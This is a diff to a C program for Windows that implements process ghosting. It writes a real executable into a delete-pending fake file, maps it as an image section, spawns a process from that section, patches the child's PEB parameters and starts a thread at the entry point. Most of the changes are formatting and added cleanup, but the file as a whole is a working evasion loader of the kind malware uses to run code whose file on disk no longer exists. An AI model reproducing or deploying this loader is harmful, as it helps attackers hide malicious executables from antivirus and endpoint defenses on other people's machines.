@@ -12,19 +12,19 @@
 
 // Store child process info
 typedef struct _CP_INFO {
-    HANDLE p_handle;
-    PROCESS_BASIC_INFORMATION pb_info;
+	HANDLE p_handle;
+	PROCESS_BASIC_INFORMATION pb_info;
 } CP_INFO, * PCP_INFO;
 
 // Get NT Header Data
-IMAGE_NT_HEADERS * get_nt_hdr(unsigned char * base_addr) {
+IMAGE_NT_HEADERS* get_nt_hdr(unsigned char* base_addr) {
 	IMAGE_DOS_HEADER* dos_hdr = (IMAGE_DOS_HEADER*)base_addr;
 
 	if (dos_hdr->e_magic != IMAGE_DOS_SIGNATURE) {
 		fprintf(stderr, "[!] Invalid DOS Header\n");
 		return NULL;
 	}
-	
+
 	LONG pe_offset = dos_hdr->e_lfanew;
 	printf("> PE Offset 0x%x\n", pe_offset);
 
@@ -35,7 +35,7 @@ IMAGE_NT_HEADERS * get_nt_hdr(unsigned char * base_addr) {
 	}
 
 	// Get NT Header
-	IMAGE_NT_HEADERS * nt_hdr = (IMAGE_NT_HEADERS *)(base_addr + pe_offset);
+	IMAGE_NT_HEADERS* nt_hdr = (IMAGE_NT_HEADERS*)(base_addr + pe_offset);
 
 	if (nt_hdr->Signature != IMAGE_NT_SIGNATURE) {
 		fprintf(stderr, "[!] Invalid NT Signature!\n");
@@ -45,20 +45,20 @@ IMAGE_NT_HEADERS * get_nt_hdr(unsigned char * base_addr) {
 }
 
 // Get Entrypoint Relative Virtual Address
-DWORD get_ep_rva(LPVOID * base_addr) {
-	IMAGE_NT_HEADERS * nt_hdr = get_nt_hdr((unsigned char *)base_addr);
+DWORD get_ep_rva(LPVOID* base_addr) {
+	IMAGE_NT_HEADERS* nt_hdr = get_nt_hdr((unsigned char*)base_addr);
 
 	if (nt_hdr == NULL) {
 		return 0;
 	}
 
-//	WORD arch = nt_hdr->FileHeader.Machine;
-	
+	//	WORD arch = nt_hdr->FileHeader.Machine;
+
 	return nt_hdr->OptionalHeader.AddressOfEntryPoint;
 }
 
 // Prepare fake_exe and put it in delete mode
-HANDLE prepare_target(char * target_exe) {
+HANDLE prepare_target(char* target_exe) {
 	HANDLE h_tfile;
 	NTSTATUS _status;
 	IO_STATUS_BLOCK io_status;
@@ -67,8 +67,8 @@ HANDLE prepare_target(char * target_exe) {
 
 	// Create Fake File
 	h_tfile = CreateFileA(
-		target_exe, 
-		DELETE | SYNCHRONIZE | FILE_GENERIC_READ | FILE_GENERIC_WRITE ,
+		target_exe,
+		DELETE | SYNCHRONIZE | FILE_GENERIC_READ | FILE_GENERIC_WRITE,
 		FILE_SHARE_READ | FILE_SHARE_WRITE,
 		NULL,
 		OPEN_ALWAYS,
@@ -87,9 +87,9 @@ HANDLE prepare_target(char * target_exe) {
 	RtlZeroMemory(&io_status, sizeof(io_status));
 	FILE_INFORMATION_CLASS f_info = FileDispositionInformation;
 	_status = NtSetInformationFile(
-		h_tfile, 
-		&io_status, 
-		&f_fileinfo, 
+		h_tfile,
+		&io_status,
+		&f_fileinfo,
 		sizeof(f_fileinfo),
 		f_info);
 
@@ -110,18 +110,18 @@ HANDLE prepare_target(char * target_exe) {
 }
 
 // Read original file
-unsigned char * read_orig_exe(char * original_exe) {
+unsigned char* read_orig_exe(char* original_exe) {
 	HANDLE hfile;
 	DWORD ho_fsz, lo_fsz;
 
 	// Open file for reading
 	hfile = CreateFileA(
-		original_exe, 
-		GENERIC_READ, 
-		0, 
-		NULL, 
-		OPEN_EXISTING, 
-		FILE_ATTRIBUTE_NORMAL, 
+		original_exe,
+		GENERIC_READ,
+		0,
+		NULL,
+		OPEN_EXISTING,
+		FILE_ATTRIBUTE_NORMAL,
 		NULL);
 
 	if (hfile == INVALID_HANDLE_VALUE) {
@@ -166,7 +166,7 @@ unsigned char * read_orig_exe(char * original_exe) {
 }
 
 // Write to Fake file and create sections
-HANDLE fetch_sections(HANDLE hfile, unsigned char * f_bytes, DWORD f_size) {
+HANDLE fetch_sections(HANDLE hfile, unsigned char* f_bytes, DWORD f_size) {
 	BOOL _res;
 	HANDLE hsection;
 	DWORD _ho_fsz;
@@ -187,7 +187,7 @@ HANDLE fetch_sections(HANDLE hfile, unsigned char * f_bytes, DWORD f_size) {
 	}
 
 	printf("> Wrote %d bytes to target!\n", f_size);
-	
+
 	// Create section object
 	hsection = 0;
 	_status = NtCreateSection(
@@ -195,7 +195,7 @@ HANDLE fetch_sections(HANDLE hfile, unsigned char * f_bytes, DWORD f_size) {
 		SECTION_ALL_ACCESS,
 		NULL,
 		0,
-		PAGE_READONLY, 
+		PAGE_READONLY,
 		SEC_IMAGE,
 		hfile
 	);
@@ -218,7 +218,7 @@ HANDLE fetch_sections(HANDLE hfile, unsigned char * f_bytes, DWORD f_size) {
 PCP_INFO create_cp(HANDLE hsection) {
 	NTSTATUS _status;
 	DWORD retlen = 0;
-	CP_INFO * p_info = (PCP_INFO)malloc(sizeof(CP_INFO));
+	CP_INFO* p_info = (PCP_INFO)malloc(sizeof(CP_INFO));
 
 	if (p_info == NULL) {
 		fprintf(stderr, "[!] Malloc() failed\n");
@@ -229,12 +229,12 @@ PCP_INFO create_cp(HANDLE hsection) {
 
 	_status = NtCreateProcess(
 		&(p_info->p_handle),
-		PROCESS_ALL_ACCESS, 
-		NULL, 
-		GetCurrentProcess(), 
-		TRUE, 
-		hsection, 
-		NULL, 
+		PROCESS_ALL_ACCESS,
+		NULL,
+		GetCurrentProcess(),
+		TRUE,
+		hsection,
+		NULL,
 		NULL);
 
 	if (!NT_SUCCESS(_status)) {
@@ -248,10 +248,10 @@ PCP_INFO create_cp(HANDLE hsection) {
 	}
 
 	_status = NtQueryInformationProcess(
-		p_info->p_handle, 
-		ProcessBasicInformation, 
+		p_info->p_handle,
+		ProcessBasicInformation,
 		&(p_info->pb_info),
-		sizeof(PROCESS_BASIC_INFORMATION), 
+		sizeof(PROCESS_BASIC_INFORMATION),
 		NULL);
 
 	if (!NT_SUCCESS(_status)) {
@@ -294,13 +294,13 @@ LPVOID write_params(HANDLE hprocess, PRTL_USER_PROCESS_PARAMETERS proc_params) {
 	// Calculate buffer size
 	buffer_size = buffer_end - (ULONG_PTR)buffer;
 
-    // --------------------------------------------------------------------------------------------------
+	// --------------------------------------------------------------------------------------------------
 	if (VirtualAllocEx(hprocess, buffer, buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) {
 		if (!WriteProcessMemory(hprocess, (LPVOID)proc_params, (LPVOID)proc_params, proc_params->Length, NULL)) {
 			fprintf(stderr, "[!] WriteProcessMemory() failed (0x%x)\n", GetLastError());
 			return NULL;
 		}
-	
+
 		if (proc_params->Environment) {
 			if (!WriteProcessMemory(hprocess, (LPVOID)proc_params->Environment, (LPVOID)proc_params->Environment, proc_params->EnvironmentSize, NULL)) {
 				fprintf(stderr, "[!] WriteProcessMemory() failed (0x%x)\n", GetLastError());
@@ -316,14 +316,14 @@ LPVOID write_params(HANDLE hprocess, PRTL_USER_PROCESS_PARAMETERS proc_params) {
 		return NULL;
 	}
 
-    // --------------------------------------------------------------------------------------------------
+	// --------------------------------------------------------------------------------------------------
 
 	if (!WriteProcessMemory(hprocess, (LPVOID)proc_params, (LPVOID)proc_params, proc_params->Length, NULL)) {
 		fprintf(stderr, "[!] WriteProcessMemory() failed (0x%x)\n", GetLastError());
 		return NULL;
 	}
 
-    // --------------------------------------------------------------------------------------------------
+	// --------------------------------------------------------------------------------------------------
 
 	if (proc_params->Environment) {
 		if (!VirtualAllocEx(hprocess, (LPVOID)proc_params->Environment, proc_params->EnvironmentSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) {
@@ -340,9 +340,9 @@ LPVOID write_params(HANDLE hprocess, PRTL_USER_PROCESS_PARAMETERS proc_params) {
 }
 
 // Read process environment block
-PEB * read_peb(HANDLE hprocess, PROCESS_BASIC_INFORMATION * p_info)
+PEB* read_peb(HANDLE hprocess, PROCESS_BASIC_INFORMATION* p_info)
 {
-	PEB * peb = (PEB *)malloc(sizeof(PEB));
+	PEB* peb = (PEB*)malloc(sizeof(PEB));
 	if (peb == NULL) {
 		fprintf(stderr, "[!] Malloc() failed (0x%x)\n", GetLastError());
 		return NULL;
@@ -366,7 +366,7 @@ PEB * read_peb(HANDLE hprocess, PROCESS_BASIC_INFORMATION * p_info)
 }
 
 // Write to peb
-BOOL write_params_to_peb(PVOID lpParamsBase, HANDLE hProcess, PROCESS_BASIC_INFORMATION * stPBI)
+BOOL write_params_to_peb(PVOID lpParamsBase, HANDLE hProcess, PROCESS_BASIC_INFORMATION* stPBI)
 {
 	// Get access to the remote PEB:
 	ULONGLONG ullPEBAddress = (ULONGLONG)(stPBI->PebBaseAddress);
@@ -395,7 +395,7 @@ BOOL write_params_to_peb(PVOID lpParamsBase, HANDLE hProcess, PROCESS_BASIC_INFO
 BOOL set_env(PCP_INFO p_info, LPWSTR w_target_name) {
 	DWORD ret_len = 0;
 	LPVOID env, param;
-	PEB * peb_copy = NULL;
+	PEB* peb_copy = NULL;
 	UNICODE_STRING u_tpath = { 0 };
 	UNICODE_STRING u_dll_dir = { 0 };
 	UNICODE_STRING u_curr_dir = { 0 };
@@ -405,10 +405,10 @@ BOOL set_env(PCP_INFO p_info, LPWSTR w_target_name) {
 
 	NTSTATUS _status;
 	_status = NtQueryInformationProcess(
-		p_info->p_handle, 
-		ProcessBasicInformation, 
-		&(p_info->pb_info), 
-		sizeof(PROCESS_BASIC_INFORMATION), 
+		p_info->p_handle,
+		ProcessBasicInformation,
+		&(p_info->pb_info),
+		sizeof(PROCESS_BASIC_INFORMATION),
 		&ret_len);
 
 	if (!__check_nt_status(_status, "NtQueryInformationProcess()")) {
@@ -420,15 +420,15 @@ BOOL set_env(PCP_INFO p_info, LPWSTR w_target_name) {
 	if (!__check_nt_status(_status, "RtlInitUnicodeString()")) {
 		return FALSE;
 	}
-	
+
 	// Copy Target Paths
 	_status = RtlInitUnicodeString(&u_tpath, w_target_name);
 	if (!__check_nt_status(_status, "RtlInitUnicodeString()")) {
 		return FALSE;
 	}
-	
+
 	// Get Current Directory as Wide Chars
-	if ((GetCurrentDirectoryW(MAX_PATH, w_dir_path)) == 0 ) {
+	if ((GetCurrentDirectoryW(MAX_PATH, w_dir_path)) == 0) {
 		fprintf(stderr, "[!] Failed to fetch Current Directory (0x%x)\n", GetLastError());
 		return FALSE;
 	}
@@ -460,14 +460,14 @@ BOOL set_env(PCP_INFO p_info, LPWSTR w_target_name) {
 	}
 
 	_status = RtlCreateProcessParameters(
-			&proc_params, 
-			(PUNICODE_STRING)&u_tpath, 
-			(PUNICODE_STRING)&u_dll_dir,
-			(PUNICODE_STRING)&u_curr_dir, 
-			(PUNICODE_STRING)&u_tpath, 
-			env, 
-			(PUNICODE_STRING)&u_window_name,
-			NULL, NULL, NULL);
+		&proc_params,
+		(PUNICODE_STRING)&u_tpath,
+		(PUNICODE_STRING)&u_dll_dir,
+		(PUNICODE_STRING)&u_curr_dir,
+		(PUNICODE_STRING)&u_tpath,
+		env,
+		(PUNICODE_STRING)&u_window_name,
+		NULL, NULL, NULL);
 
 	if (!__check_nt_status(_status, "RtlCreateProcessParameters()")) {
 		return FALSE;
@@ -489,7 +489,7 @@ BOOL set_env(PCP_INFO p_info, LPWSTR w_target_name) {
 		return FALSE;
 	}
 	free(peb_copy);
-	
+
 	peb_copy = read_peb(p_info->p_handle, &(p_info->pb_info));
 	if (read_peb == NULL) {
 		return FALSE;
@@ -513,17 +513,17 @@ int spawn_process(char* real_exe, char* fake_exe) {
 	}
 
 	// read contents from the real executable
-	unsigned char * f_bytes = read_orig_exe(real_exe);
+	unsigned char* f_bytes = read_orig_exe(real_exe);
 	if (real_exe == NULL) {
 		CloseHandle(hfakefile);
 		return -2;
 	}
 
 	f_size = (DWORD)_msize(f_bytes);
-	
+
 	// Fetch Section object
 	hsection = fetch_sections(hfakefile, f_bytes, f_size);
- 	
+
 	if (hsection == NULL) {
 		CloseHandle(hfakefile);
 		free(f_bytes);
@@ -553,7 +553,7 @@ int spawn_process(char* real_exe, char* fake_exe) {
 	CloseHandle(hsection);
 	printf("==== Assigning Env and CL Arguments ====\n");
 
-	wchar_t * w_fname = (wchar_t*)malloc((strlen(fake_exe) + 1) * 2);
+	wchar_t* w_fname = (wchar_t*)malloc((strlen(fake_exe) + 1) * 2);
 	if (w_fname == NULL) {
 		fprintf(stderr, "[!] Failed to allocate memory for Wide File Name\n");
 		CloseHandle(p_info->p_handle);
@@ -568,55 +568,66 @@ int spawn_process(char* real_exe, char* fake_exe) {
 		CloseHandle(p_info->p_handle);
 		return -8;
 	}
-		
+
 	if (!set_env(p_info, w_fname)) {
 		fprintf(stderr, "[!] Failed to set environment variables\n");
 		free(w_fname);
-		CloseHandle(p_info->p_handle);	
+		CloseHandle(p_info->p_handle);
 		return -9;
-	} 
+	}
 	free(w_fname);
 	printf("> Set Environment and Proc Args\n");
-	
-	PEB * _peb_copy = read_peb(p_info->p_handle, &(p_info->pb_info));
+
+	PEB* _peb_copy = read_peb(p_info->p_handle, &(p_info->pb_info));
 	if (_peb_copy == NULL) {
 		CloseHandle(p_info->p_handle);
 		return -10;
-	} 
+	}
 
 	PEB peb_copy = { 0 };
 	memcpy(&peb_copy, _peb_copy, sizeof(PEB));
 	free(_peb_copy);
 	ULONGLONG image_base = (ULONGLONG)(peb_copy.ImageBaseAddress);
 	ULONGLONG proc_entry = entry_point + image_base;
-	printf("==== Creating Child Process ====\n");
+	printf("==== Creating Thread In Child Process ====\n");
 
 	HANDLE hthread = NULL;
 
 	NTSTATUS _status = NtCreateThreadEx(
-		&hthread, 
-		THREAD_ALL_ACCESS, 
-		NULL, 
-		p_info->p_handle, 
-		(LPTHREAD_START_ROUTINE)(proc_entry), 
-		NULL, 
+		&hthread,
+		THREAD_ALL_ACCESS,
+		NULL,
+		p_info->p_handle,
+		(LPTHREAD_START_ROUTINE)(proc_entry),
+		NULL,
 		FALSE, NULL, NULL, NULL, NULL);
 
 	if (!NT_SUCCESS(_status)) {
 		fprintf(stderr, "[!] NtCreateThreadEx() failed(0x%x)\n", _status);
+		CloseHandle(p_info->p_handle);
+		free(p_info);
 		return -11;
+	}
+
+	if (hthread == NULL) {
+		fprintf(stderr, "[!] Invalid Thread Handle (0x%x)\n", GetLastError());
+		CloseHandle(p_info->p_handle);
+		free(p_info);
+		return -13;
 	}
 
 	printf("> Success - Threat ID %d\r\n", GetThreadId(hthread));
 
-	WaitForSingleObject( p_info->p_handle, INFINITE);
+	WaitForSingleObject(p_info->p_handle, INFINITE);
 
+	CloseHandle(hthread);
 	CloseHandle(p_info->p_handle);
+	free(p_info);
 	return 0;
 }
 
 int main(int argc, char** argv) {
-	
+
 	if (argc != 3) {
 		fprintf(stderr, "[!] Invalid Usage\n");
 		fprintf(stderr, "[i] Usage: %s <REAL EXE> <FAKE EXE>\n", argv[0]);
